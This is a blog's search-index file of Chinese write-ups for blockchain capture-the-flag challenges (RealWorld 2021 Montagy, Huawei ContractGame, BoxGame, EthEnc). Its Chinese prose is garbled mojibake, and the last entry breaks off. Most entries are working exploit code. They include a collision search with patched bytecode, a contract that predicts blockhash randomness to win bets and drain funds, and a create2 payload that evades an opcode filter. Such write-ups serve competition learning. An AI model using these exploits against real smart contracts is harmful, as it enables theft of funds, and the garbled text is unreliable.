<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Á¨¨‰∏âÂ±ärealworld Âå∫ÂùóÈìæwp]]></title>
    <url>%2F2021%2Frw2021%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Á¨¨‰∏âÂ±ä realworld, blockchains ÁöÑ WP ÊÄªÂÖ±Êúâ‰∏âÈ¢òÔºåÈòü‰ºçÊÄªÂÖ±ÂÅöÂá∫‰∏§ÈÅìÔºåÂêéÁª≠‰ºöÊåÅÁª≠Êõ¥Êñ∞ ÈöèÊó∂Ê¨¢ËøéÂ§ßÂÆ∂‰∫§ÊµÅÔºåÈöè‰æøÂÜôÂÜô ÁÇπÂáªËøôÈáå -&gt; È¢òÁõÆÈôÑ‰ª∂ Montagy È¢òÁõÆÁõÆÊ†áÊ∏ÖÁ©∫‰ΩôÈ¢ù ÂíåÈòüÂèã‰∏ÄËµ∑ÂÅöÂá∫Êù•ÁöÑÈ¢òÁõÆÔºåÂ∫îËØ•ÊòØÈùûÈ¢ÑÊúüÂÅöÂá∫Êù•ÁöÑÔºåËøôÈáå‰ºöÂ∞ÜÊàë‰ª¨ÁöÑËß£Ê≥ïÂíåÈ¢ÑÊúüËß£Ê≥ïÈÉΩÁ®çÂæÆÂÜô‰∏Ä‰∏ã ÈùûÈ¢ÑÊúüËß£Ê≥ï Êàë‰ª¨ÂÅöÂá∫Êù•ÁöÑÈ¢òÁõÆÂú∞ÂùÄ https://rinkeby.etherscan.io/address/0x8095e742cFeAFf77b92BdE56951388a6585E98d5 ÈùûÈ¢ÑÊúüÊÄùÊÉ≥Â∞±ÊòØÁ¢∞ÊíûÔºåÁ¢∞Êíû‰ª£Á†ÅÊù•Ëá™‰∫é liangjs Â∏àÂÇÖ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;cstdio&gt;#include &lt;ctime&gt;#include &lt;cstdint&gt;#include &lt;cstdlib&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;uint64_t forw(uint32_t t1, uint32_t t2, uint32_t m1, uint32_t m2, uint32_t m3, uint32_t m4)&#123; uint32_t p1, p2, p3; uint32_t s = 0x6644498b; for (int i = 0; i &lt; 16; ++i) &#123; s = s + 0x68696e74; p1 = (t1&lt;&lt;4) - m1; p2 = t1 + s; p3 = (t1&gt;&gt;5) + m2; t2 = t2 + (p1^(p2^p3)); p1 = (t2&lt;&lt;4) + m3; p2 = t2 + s; p3 = (t2&gt;&gt;5) - m4; t1 = t1 + (p1^(p2^p3)); &#125; return ((uint64_t)t1 &lt;&lt; 32) | t2;&#125;uint64_t back(uint32_t t1, uint32_t t2, uint32_t m1, uint32_t m2, uint32_t m3, uint32_t m4)&#123; uint32_t p1, p2, p3; uint32_t s = (0x6644498b+0x68696e74ull*16) &amp; 0xffffffff; for (int i = 0; i &lt; 16; ++i) &#123; p1 = (t2&lt;&lt;4) + m3; p2 = t2 + s; p3 = (t2&gt;&gt;5) - m4; t1 = t1 - (p1^(p2^p3)); p1 = (t1&lt;&lt;4) - m1; p2 = t1 + s; p3 = (t1&gt;&gt;5) + m2; t2 = t2 - (p1^(p2^p3)); s = s - 0x68696e74; &#125; return ((uint64_t)t1 &lt;&lt; 32) | t2;&#125;int main()&#123; srand(time(0)); vector&lt;uint64_t&gt; data; data.reserve(1ull&lt;&lt;31); uint32_t tb1 = 443551905, tb2 = 186746487; uint32_t te1 = 1418013151, te2 = 3531071330; for (uint64_t i = 0; i &lt; (1ull&lt;&lt;31); ++i) &#123; uint64_t v = forw(tb1, tb2, 0, 0, 0, i); data.push_back(v); if (i % 10000000 == 0) printf(&quot;i=%ld\n&quot;,i); &#125; printf(&quot;sort\n&quot;); sort(data.begin(), data.end()); printf(&quot;unique\n&quot;); data.erase(unique(data.begin(), data.end()), data.end()); uint64_t gv = 0; for (uint64_t m3 = 0;; ++m3) &#123; vector&lt;uint64_t&gt; data2; data2.reserve(1ull&lt;&lt;30); for (uint64_t m4 = 0; m4 &lt; (1ull&lt;&lt;30); ++m4) &#123; uint64_t v = back(te1, te2, 0, 0, m3, m4); data2.push_back(v); if (m4 % 10000000 == 0) printf(&quot;i=%ld\n&quot;, m4); &#125; printf(&quot;sort\n&quot;); sort(data2.begin(), data2.end()); uint64_t i = 0, j = 0; while (i &lt; data.size() &amp;&amp; j &lt; data2.size()) &#123; if (data[i] == data2[j]) &#123; gv = data[i]; break; &#125; else if (data[i] &lt; data2[j]) ++i; else ++j; &#125; if (gv != 0) &#123; printf(&quot;gv=%lx\n&quot;, gv); printf(&quot;m3=%lx\n&quot;, m3); for (uint64_t m4 = 0; m4 &lt; (1ull&lt;&lt;30); ++m4) &#123; uint64_t v = back(te1, te2, 0, 0, m3, m4); if (v == gv) &#123; printf(&quot;m4=%lx\n&quot;, m4); break; &#125; &#125; break; &#125; &#125; for (uint64_t i = 0; i &lt; (1ull&lt;&lt;31); ++i) &#123; uint64_t v = forw(tb1, tb2, 0, 0, 0, i); if (v == gv) &#123; printf(&quot;m4=%lx\n&quot;, i); break; &#125; &#125; return 0;&#125; ËøôÊòØÊàë‰ª¨ÈÉ®ÁΩ≤ÁöÑ newPuzzle ÔºåÊàë‰ª¨ÊòØÁõ¥Êé•ÊîπÁöÑÈ¢òÁõÆ‰∏≠ÁöÑ newPuzzle ÔºåÊää 0x403 Â≠óËäÇ‰ΩçÁΩÆÁöÑ 0x14ÔºàÁ≠â‰∫éÔºâ Êîπ‰∏∫‰∫Ü 0x10ÔºàÂ∞è‰∫éÔºâÔºåËøôÊ†∑Èöè‰æøÊâæ‰∏Ä‰∏™ seed Êª°Ë∂≥Êù°‰ª∂Âç≥ÂèØÔºåÂΩìÁÑ∂‰πüÂèØ‰ª•Áõ¥Êé•ÂÜô‰∏Ä‰∏™ÊîªÂáªÂêàÁ∫¶Ë∞ÉÁî®È¢òÁõÆÁöÑ solve ‰πüË°åÔºàÂ°´ÂÖÖÂà∞ÊåáÂÆöÂ≠óËäÇÔºåÁÑ∂ÂêéÁ¢∞Êíû‰πüÂèØ‰ª•Ôºâ 10x608060405234801561001057600080fd5b50336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610542806100606000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c806304f77cfa146100515780634059e88714610073578063fd922a42146101c5578063ffa644851461020f575b600080fd5b61005961028e565b604051808215151515815260200191505060405180910390f35b6101c36004803603604081101561008957600080fd5b81019080803590602001906401000000008111156100a657600080fd5b8201836020820111156100b857600080fd5b803590602001918460018302840111640100000000831117156100da57600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f8201169050808301925050505050505091929192908035906020019064010000000081111561013d57600080fd5b82018360208201111561014f57600080fd5b8035906020019184600183028401116401000000008311171561017157600080fd5b91908080601f016020809104026020016040519081016040528093929190818152602001838380828437600081840152601f19601f820116905080830192505050505050509192919290505050610362565b005b6101cd61049e565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61028c600480360361012081101561022657600080fd5b810190808035906020019092919080359060200190929190803590602001909291908035906020019092919080359060200190929190803590602001909291908035906020019092919080359060200190929190803590602001909291905050506104c3565b005b6000806009546008546007541818600654600554600454181860035460025460015418180101905060006009546006546003540101600854600554600254010160075460045460015401011818905063aabbccdd818301106102ef57600080fd5b708261e26b90505061031256e5afb60721cb821161030c57600080fd5b8082027ef35b6080614321368282376084810151606401816080016143855161051756101561033a57600080fd5b6f65e670d9bd540cea22fdab97e36840e2818303101561035957600080fd5b60019250505090565b61036a61028e565b61037357600080fd5b716111d850336107ef16565b908018915a905660701b6dffffffffffffffffffffffffffff19168280519060200120101561049a576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166376fe1e92826040518263ffffffff1660e01b81526004018080602001828103825283818151815260200191508051906020019080838360005b8381101561043557808201518184015260208101905061041a565b50505050905090810190601f1680156104625780820380516001836020036101000a031916815260200191505b5092505050600060405180830381600087803b15801561048157600080fd5b505af1158015610495573d6000803e3d6000fd5b505050505b5050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b88600181905550876002819055508660038190555085600481905550846005819055508360068190555082600781905550816008819055508060098190555050505050505050505056fea265627a7a723158205b60025b80600514615676d5110000000000000000000000001230212a0000000100000000000000000032 Âõ†‰∏∫Êàë‰ª¨ÊòØÁõ¥Êé•ÊîπÁöÑÈ¢òÁõÆ‰∏≠ÁöÑ puzzle ÔºåÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶ÅÁªïËøá loose ÔºåËøôÈáåÊòØ 1ph0n Â∏àÂÇÖÊèê‰æõÁöÑ 123456789101112131415161718192021222324252627282930313233343536# loose() writeupfor a in range(1, 16): for b in range(1, 16): for c in range(1, 16): if a + b + c == 7 and a ^ b ^ c == 3: print(a, b, c) # output:# 2 2 3 # 2 3 2 # 3 2 2# match them to:# a b c# d e f# g h ia = 0x2000000000000000000000000000000000000000000000000000000000000000b = 0x2000000000000000000000000000000000000000000000000000000000000000c = 0x3000000000000000000000000000000000000000000000000000000000000000d = 0x2000000000000000000000000000000000000000000000000000000000000000e = 0x3000000000000000000000000000000000000000000000000000000000000000f = 0x2000000000000000000000000000000000000000000000000000000000000000g = 0x3000000000000000000000000000000000000000000000000000000000000000h = 0x2000000000000000000000000000000000000000000000000000000000000000i = 0x2000000000000000000000000000000000000000000000000000000000000000# test: t1 = (a^b^c)+(d^e^f)+(g^h^i)t2 = (a+d+g)^(b+e+h)^(c+f+i)print(hex(t1))print(hex(t2))print((t1 + t2) % 0x10000000000000000000000000000000000000000000000000000000000000000 &lt; 0xaabbccdd )print(t1 &gt; 0x8261e26b90505061031256e5afb60721cb)print(0xf35b6080614321368282376084810151606401816080016143855161051756 &gt;= (t1*t2) % 0x10000000000000000000000000000000000000000000000000000000000000000)print(t1 - t2 &gt;= 0x65e670d9bd540cea22fdab97e36840e2) ÁÑ∂ÂêéÂ∞±ÂèØ‰ª•Êâæ‰∏Ä‰∏™ seed Á¨¶ÂêàÊàë‰ª¨ÊîπËøá‰πãÂêéÁöÑÊù°‰ª∂ÔºàÊù°‰ª∂Êîπ‰∏∫‰∫ÜÂ∞è‰∫éÔºâÂ∞±Ë°åÂï¶ È°∫‰æøËøôÈáåÊèíÂò¥‰∏ÄÂè•ÔºåÁî±‰∫éÊàëÊã•ÊúâÂº∫Â§ßÁöÑÊöóÈªë‰πãÂäõÔºåü§ìÊàëÊâæÂà∞‰∫ÜÊâÄÊúâÈòü‰ºçÂÅöËøôÈÅìÈ¢òÁõÆÁöÑÂú∞ÂùÄÔºåÂêºÂêºÂìàÂòøÔºåÂø´Â§∏Êàëüê∂ÔºàÂè™Ê†áÊ≥®‰∫Ü‰∏Ä‰∫õÈòü‰ºçÔºâ 12345678910111213141516170x05751749a85D2149C76BC035af4826208Dd9118b AAA0x0F4f4c78cE13b69239A676fE65C72bf974b3fCa30x6D2BD358b7788E27C271eFE4d40b7A82F6E6c7830x6BA08F6731509c63026Bc431023F35e49fF4f8fC0x8FA83b9e152120F11c13d678c7879C3eC2f14DB70xA54c712054dEDD5587B5c39F1DF0Aab8BD782B630xC66005B6295f396b4289219486aC62aCFC0Ff4d40xbc16Cf28E491Ae88C36638642e7673Af4570A1e40x3E8C7FEc0166bd59Ca1FcD0672bF8E3915c56Bdf0x4E8d7823046b3CE7eBd99F7282B18c3DaDD879ED0x44cE28ad66C38dD334C518EA6f07248a1B3EA08C0x6B217cbB59e6d0edb104D815db749436708434630x60a05Ada89061221e1602957097248FC8c373fE4 0ops0xDA93b922A68d42Edd7E377f4E06fD574A70B61230x726a02a9176e8E458CE8bD75305B92e72a8b4eA2 Sauercloud0x00E457CD4A251d58D9Af7F674857c78a6Dc73e8F0x11674249BdC62045947e3022808B6dfD009573B6 È¢ÑÊúüËß£Ê≥ï È¢ÑÊúüËß£Ê≥ïÂ∫îËØ•ÊòØÊØîÁâπÁøªËΩ¨ÔºàËøôÊòØ tag ‰∏≠ÂèòÂΩ¢ tea ÁÆóÊ≥ïÁöÑÁâπÊÄßÔºâÔºåËøô‰∏™Âú®ÊØîËµõ‰∏≠‰πüÂèëÁé∞‰∫ÜÔºå‰∏çËøáÈòüÂèãÈÉΩÁ¢∞ÊíûÂá∫‰∫ÜÔºåÂ∞±Ê≤°ÊúâÁªßÁª≠Âêë‰∏ãÁúãÔºåÂÖ®Âú∫Èòü‰ºçÂ∫îËØ•Âè™Êúâ 0ops ÊòØÈ¢ÑÊúüËß£ÔºåÂÆÉ‰ª¨ÁöÑÂú∞ÂùÄÊòØ https://rinkeby.etherscan.io/address/0x60a05ada89061221e1602957097248fc8c373fe4 ÊîπÂä® 6 bitÔºåÂÖ∑‰ΩìËá™Ë°åÂàÜÊûêÔºåÊàñËÄÖ‰πüÂèØ‰ª•Á≠âÂÆòÊñπÈ¶ñÂ∏≠ÁöÑ WPÔºå‰∏çÊÉ≥ÂàÜÊûê‰∫Ü23333ÔºåÊáíÁôåÊÇ£ËÄÖÔºåÁ≠âÂÆòÊñπ WP ÂÖ¨Â∏É‰πãÂêé‰ºöÊê¨ËøêËøáÊù•ÔºåÊàëÂè™ÊòØ‰∏™Êê¨ËøêÂ∑•5555 EasyDefi ËøôÊòØ sissel Â∏àÂÇÖÂÅöÂá∫Êù•ÁöÑÈ¢òÁõÆÔºåÁúãÁúãÂ∏àÂÇÖ‰ºö‰∏ç‰ºöÊîæ wp Âï¶ÔºåÊàëÂ∞±ÂÖà‰∏çÂÜôÂï¶ billboard Êú™Ëß£Âá∫ÔºåËôΩÁÑ∂ËµõÂêéÂí®ËØ¢‰∫ÜÂá∫È¢ò‰∫∫Ê≠£Á°ÆËß£Ê≥ïÔºåÁü•ÈÅì‰∫ÜÂ§ßÊ¶ÇÂéüÂõ†Ôºå‰ΩÜËøòÊòØÂáÜÂ§áÁ≠âÂæÖÂÆòÊñπ WP ÂêéÂÜçÊõ¥Êñ∞ üëâ ÂÆòÊñπWP üëà Êù•Âï¶ ü§ì]]></content>
      <categories>
        <category>realworld2021</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>realworld2021</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Âçé‰∏∫È∏øËíôÂú∫Âå∫ÂùóÈìæ ContractGame]]></title>
    <url>%2F2020%2Fcontractgame%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Âçé‰∏∫È∏øËíôÂú∫Âå∫ÂùóÈìæÈ¢òÁõÆ Ê∞¥È¢òÔºåÊàë Ver Âñ∑ÁöÑÈ¢òÈÉΩÊòØÊ∞¥È¢ò Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112pragma solidity ^0.4.23;contract ContractGame &#123; event SendFlag(address addr); mapping(address =&gt; bool) internal authPlayer; uint private blocknumber; uint private gameFunds; uint private cost; bool private gameStopped = false; address public owner; bytes4 private winningTicket; uint randomNumber = 0; mapping(address=&gt;bool) private potentialWinner; mapping(address=&gt;uint256) private rewards; mapping(address=&gt;bytes4) private ticketNumbers; constructor() public payable &#123; gameFunds = add(gameFunds, msg.value); cost = div(gameFunds, 10); owner = msg.sender; rewards[address(this)] = msg.value; &#125; modifier auth() &#123; require(authPlayer[msg.sender], &quot;you are not authorized!&quot;); _; &#125; function add(uint256 a, uint256 b) internal pure returns (uint256) &#123; uint256 c = a + b; require(c &gt;= a, &quot;SafeMath: addition overflow&quot;); return c; &#125; function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &lt;= a); uint256 c = a - b; return c; &#125; function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123; if (a == 0) &#123; return 0; &#125; uint256 c = a * b; require(c / a == b, &quot;SafeMath: multiplication overflow&quot;); return c; &#125; function div(uint256 a, uint256 b) internal pure returns (uint256) &#123; require(b &gt; 0); uint256 c = a / b; return c; &#125; function BetGame(bool mark) external payable &#123; require(msg.value == cost); require(gameFunds &gt;= div(cost, 2)); bytes32 entropy = blockhash(block.number-1); bytes1 coinFlip = entropy[10] &amp; 1; if ((coinFlip == 1 &amp;&amp; mark) || (coinFlip == 0 &amp;&amp; !mark)) &#123; gameFunds = sub(gameFunds, div(msg.value, 2)); msg.sender.transfer(div(mul(msg.value, 3), 2)); &#125; else &#123; gameFunds = add(gameFunds, msg.value); &#125; if (address(this).balance==0) &#123; winningTicket = bytes4(0); blocknumber = block.number + 1; gameStopped = false; potentialWinner[msg.sender] = true; rewards[msg.sender] += msg.value; ticketNumbers[msg.sender] = bytes4((msg.value - cost)/10**8); &#125; &#125; function closeGame() external auth &#123; require(!gameStopped); require(blocknumber != 0); require(winningTicket == bytes4(0)); require(block.number &gt; blocknumber); require(msg.sender == owner || rewards[msg.sender] &gt; 0); winningTicket = bytes4(blockhash(blocknumber)); potentialWinner[msg.sender] = false; gameStopped = true; &#125; function winGame() external auth &#123; require(gameStopped); require(potentialWinner[msg.sender]); if(winningTicket == ticketNumbers[msg.sender])&#123; emit SendFlag(msg.sender); &#125; selfdestruct(msg.sender); &#125; function AddAuth(address addr) external &#123; authPlayer[addr] = true; &#125; function() public payable auth&#123; if(msg.value == 0) &#123; this.closeGame(); &#125; else &#123; this.winGame(); &#125; &#125;&#125; Analyse È¢òÁõÆÈÄÜÂêë‰∏çÈöæÔºå‰ΩÜÊòØËæÉ‰∏∫Â§çÊùÇÔºå‰∏äÈù¢ÊòØÊ∫êÁ†Å ËÄÉÁÇπÊúâ‰∏â‰∏™Ôºö ËÄÉÂØüÂØπÂä®ÊÄÅÊï∞ÁªÑ„ÄÅmapÁ±ªÂûãÊï∞ÊçÆÁöÑÂ≠òÂÇ®ËßÑÂàôËÆ°ÁÆó ËÄÉÂØü blockhash ËÄÉÂØü fallback Âèä msg.sender ÁöÑÁêÜËß£ Exp12345678910111213141516171819202122232425262728contract hack &#123; ContractGame target = ContractGame(È¢òÁõÆÂú∞ÂùÄ); // first: call pwn with 2 ether function pwn() payable public &#123; bytes32 entropy = block.blockhash(block.number-1); bytes1 coinFlip = entropy[10] &amp; 1; for(int i=0;i&lt;20;i++)&#123; if (coinFlip == 1)&#123; target.BetGame.value(100000000000000000)(true); &#125; else &#123; target.BetGame.value(100000000000000000)(false); &#125; &#125; &#125; // second: call AddAuth(È¢òÁõÆÂêàÁ∫¶Âú∞ÂùÄ) // third: call AddAuth(Â§ñÈÉ®Ë¥¶Êà∑Âú∞ÂùÄ) // forth: call AddAuth(ÊîªÂáªÂêàÁ∫¶Âú∞ÂùÄ) // fifth: after 256 blocks then call fallbackÔºàÂèØ‰ª•ÈÄöËøáÂ§ñÈÉ®Ë¥¶Êà∑Áõ¥Êé•ËΩ¨Ë¥¶msg.value=0Âç≥ÂèØÔºåÁÑ∂Âêé‰ºöË∞ÉÁî®closeGameÂáΩÊï∞Ôºâ // sixth: call winGame() function winGame() public &#123; target.winGame(); &#125; function() payable &#123;&#125;&#125; ÂÖ∑‰ΩìËøáÁ®ãÈÉΩÂú®‰∏äÈù¢ exp ÁöÑÊ≥®ÈáäÈáåÈù¢ ÊåâÁÖß first Âà∞ sixth ÁöÑÈ°∫Â∫èÊâßË°åÂç≥ÂèØ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>Âçé‰∏∫È∏øËíôÂú∫ ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Âçé‰∏∫È≤≤ÈπèËÆ°ÁÆóÂú∫Âå∫ÂùóÈìæ boxgame]]></title>
    <url>%2F2020%2Fboxgame%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Âçé‰∏∫È≤≤ÈπèËÆ°ÁÆóÂú∫Âå∫ÂùóÈìæÈ¢òÁõÆ ‰∏Ä‰∏™Ê≤ôÁÆ±Ê∏∏ÊàèÔºåÊØîËæÉÁÆÄÂçï Source È¢òÁõÆÂêàÁ∫¶Â¶Ç‰∏ãÊâÄÁ§∫ 12345678910111213141516171819202122232425262728293031323334pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; constructor(bytes memory a) payable public &#123; assembly &#123; return(add(0x20, a), mload(a)) &#125; &#125; function check(address _addr) public &#123; uint size; assembly &#123; size := extcodesize(_addr) &#125; require(size &gt; 0 &amp;&amp; size &lt;= 4); target = _addr; &#125; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); target.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; ÊûÑÈÄ†ÂáΩÊï∞‰∏≠ÁöÑÁúüÂÆûÂêàÁ∫¶Â¶Ç‰∏ã 1234567891011121314151617181920212223242526272829303132333435363738394041pragma solidity ^0.5.10;contract BoxGame &#123; event ForFlag(address addr); address public target; function payforflag(address payable _addr) public &#123; require(_addr != address(0)); uint256 size; bytes memory code; assembly &#123; size := extcodesize(_addr) code := mload(0x40) mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(code, size) extcodecopy(_addr, add(code, 0x20), 0, size) &#125; for(uint256 i = 0; i &lt; code.length; i++) &#123; require(code[i] != 0xf0); // CREATE require(code[i] != 0xf1); // CALL require(code[i] != 0xf2); // CALLCODE require(code[i] != 0xf4); // DELEGATECALL require(code[i] != 0xfa); // STATICCALL require(code[i] != 0xff); // SELFDESTRUCT &#125; _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;)); selfdestruct(_addr); &#125; function sendFlag() public payable &#123; require(msg.value &gt;= 1000000000 ether); emit ForFlag(msg.sender); &#125;&#125; Analyse ÂêàÁ∫¶ÁöÑ constructor ÂáΩÊï∞‰∏≠ÈÉ®ÁΩ≤ÁöÑÂêàÁ∫¶ÊâçÊòØÁúüÊ≠£ÁöÑÂêàÁ∫¶ÔºåÊâÄ‰ª•ÂàÜÊûêÊûÑÈÄ†ÂáΩÊï∞ÈáåÈù¢ÁöÑÂ≠óËäÇÁ†ÅÂç≥ÂèØ ÂÖ∂ÂÆûÁõ∏ÂΩì‰∫é‰∏Ä‰∏™Ê≤ôÁõíÔºåËøáÊª§‰∫Ü f0 f1 f2 f4 fa ff Ëøô‰∫õÂ≠óËäÇÔºåÂç≥ÊîªÂáªÂêàÁ∫¶‰∏≠Â≠óËäÇÁ†Å‰∏çËÉΩÂá∫Áé∞Ëøô‰∫õÂ≠óËäÇÔºåÂèØ‰ª•ÂèëÁé∞ f5 ÂØπÂ∫îÁöÑ create2 Ê≤°ÊúâË¢´ËøáÊª§ÔºåÊâÄ‰ª•ÂèØÁî® create2 ÂàõÂª∫‰∏Ä‰∏™ emit ForFlag(0) ÁöÑÂêàÁ∫¶Ôºå‰∏≠Èó¥Â¶ÇÊûúÊúâÁ¶ÅÊ≠¢ÁöÑÂ≠óËäÇÔºåËΩ¨Êç¢‰∏Ä‰∏ãÂç≥ÂèØ Exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859contract pikachu &#123; /* emit ForFlag(address(0)); 7F PUSH32 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2 60 PUSH1 0x00 60 PUSH1 0x40 51 MLOAD 80 DUP1 82 DUP3 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 73 PUSH20 0xffffffffffffffffffffffffffffffffffffffff 16 AND 81 DUP2 52 MSTORE 60 PUSH1 0x20 01 ADD 91 SWAP2 50 POP 50 POP 60 PUSH1 0x40 51 MLOAD 80 DUP1 91 SWAP2 03 SUB 90 SWAP1 A1 LOG1 */ // Â∞Ü‰∏äËø∞Â≠óËäÇÁ†ÅÈÄöËøá‰∏Ä‰∫õËΩ¨Êç¢‰∏çÂåÖÂê´f0 f1 f2 f4 fa ffÂç≥ÂèØ constructor() public payable &#123; assembly &#123; mstore(0x500, 0x7f89814845d4e005a4059f76ea572f39df73fbe3d1c9b20e12b3b03d09f999b9) mstore(0x520, 0xe27f000000000010000000000000000000000000000000000100000000000000) mstore(0x540, 0x0000016000604051808273eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee73) mstore(0x560, 0x1111111111111111111111111111111111111111011673eeeeeeeeeeeeeeeeee) mstore(0x580, 0xeeeeeeeeeeeeeeeeeeeeee731111111111111111111111111111111111111111) mstore(0x5a0, 0x0116815260200191505060405180910390a13460b26105003031f50000000000) return(0x500, 0x5c0) &#125; &#125;&#125;contract Hack &#123; BoxGame private constant target = BoxGame(0x4c3aa84018A031C11bE09e4b2dCC346Ae055956d); constructor() public payable &#123; bool result; // emit ForFlag(0) pikachu hack = new pikachu(); (result, ) = address(target).call(abi.encodeWithSelector( 0xc1803191, hack )); require(result); &#125;&#125; Áõ¥Êé•ÈÉ®ÁΩ≤ Hack Âç≥ÂèØ]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Smart Contract</tag>
        <tag>Âçé‰∏∫È≤≤ÈπèËÆ°ÁÆó ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Âçé‰∏∫‰∫ëÂÆâÂÖ®Âú∫Âå∫ÂùóÈìæ ethenc]]></title>
    <url>%2F2020%2Fethenc%2F</url>
    <content type="text"><![CDATA[ÂâçË®Ä Âçé‰∏∫‰∫ëÂÆâÂÖ®Âú∫Âå∫ÂùóÈìæÈ¢òÁõÆ ÂÖ∂ÂÆûÂæàÁÆÄÂçïÔºåÂíåÂå∫ÂùóÈìæÂÖ≥Á≥ª‰∏çÂ§ß Source123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130pragma solidity ^0.6.12;contract EthEnc &#123; address private owner; //0 uint private key; //1 uint private delta; //2 uint public output; //3 uint32 private sum; uint224 private tmp_sum=0; //4 uint32 private key0; uint224 private t0=0; //5 uint32 private key1; uint224 private t1=0; //6 uint32 private key2; uint224 private t2=0; //7 uint32 private key3; uint224 private t3=0; //8 uint randomNumber = 0; string private s; event OhSendFlag(address addr); constructor() public payable &#123; // key = 0x74686974 5f69735e 5f746573 746b6579 key = 0x746869745f69735e5f746573746b6579; delta = 0xb3c6ef3720; &#125; modifier auth &#123; require(msg.sender == owner || msg.sender == address(this), &quot;EthEnc: not authorized&quot;); _; &#125; function payforflag() public auth &#123; require(output == 2282910687825444608285583946662268071674116917685196567156); emit OhSendFlag(msg.sender); selfdestruct(msg.sender); &#125; function Convert(string memory source) internal pure returns (uint result) &#123; bytes32 tmp; assembly &#123; tmp := mload(add(source, 32)) &#125; result = uint(tmp) / 0x10000000000000000; &#125; // Ê≠£ 0x 5f5f6f68 5f66616e 74616e73 69746963 5f626162 795f5f5f __oh_fantansitic_baby___ function set_s(string memory _s) public &#123; s = _s; &#125; function Encrypt() public &#123; uint tmp = Convert(s); assembly &#123; let first,second sstore(5, and(shr(96, sload(1)), 0xffffffff)) sstore(6, and(shr(64, sload(1)), 0xffffffff)) sstore(7, and(shr(32, sload(1)), 0xffffffff)) sstore(8, and(sload(1), 0xffffffff)) let step := 1 for &#123; let i := 1 &#125; lt(i, 4) &#123; i := add(i, 1) &#125; &#123; first := and(shr(mul(add(sub(24, mul(i, 8)), 4), 8), tmp), 0xffffffff) second := and(shr(mul(sub(24, mul(i, 8)), 8), tmp), 0xffffffff) sstore(4, 0) for &#123;let j := 0 &#125; lt(j, 32) &#123; j := add(j, 1) &#125; &#123; let tmp11,tmp12 let tmp21,tmp22 tmp11 := and(add(xor(and(mul(second, 16), 0xffffffff), and(div(second, 32), 0xffffffff)), second), 0xffffffff) switch and(and(sload(4),0xffffffff), 3) case 0 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp12 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; first := and(add(first, xor(tmp11, tmp12)), 0xffffffff) sstore(4, and(add(and(sload(4), 0xffffffff), shr(5, sload(2))), 0xffffffff)) tmp21 := and(add(xor(and(mul(first, 16), 0xffffffff), and(div(first, 32), 0xffffffff)), first), 0xffffffff) switch and(and(shr(11, and(sload(4),0xffffffff)), 0xffffffff), 3) case 0 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(5),0xffffffff)), 0xffffffff) &#125; case 1 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(6),0xffffffff)), 0xffffffff) &#125; case 2 &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(7),0xffffffff)), 0xffffffff) &#125; default &#123; tmp22 := and(add(and(sload(4),0xffffffff), and(sload(8),0xffffffff)), 0xffffffff) &#125; second := and(add(second, xor(tmp21, tmp22)), 0xffffffff) &#125; sstore(3, add(sload(3), add(shl(sub(192, mul(step, 32)), first), shl(sub(192, mul(i, 64)), second)))) step := add(step, 2) &#125; &#125; &#125; receive() external payable &#123; if(msg.value == 0) &#123; this.payforflag(); &#125; else &#123; this.Encrypt(); &#125; &#125;&#125; Analyse È¢òÁõÆÈúÄË¶ÅÈÄÜÂêëÔºå‰∏äÈù¢ÊòØÊ∫êÁ†Å 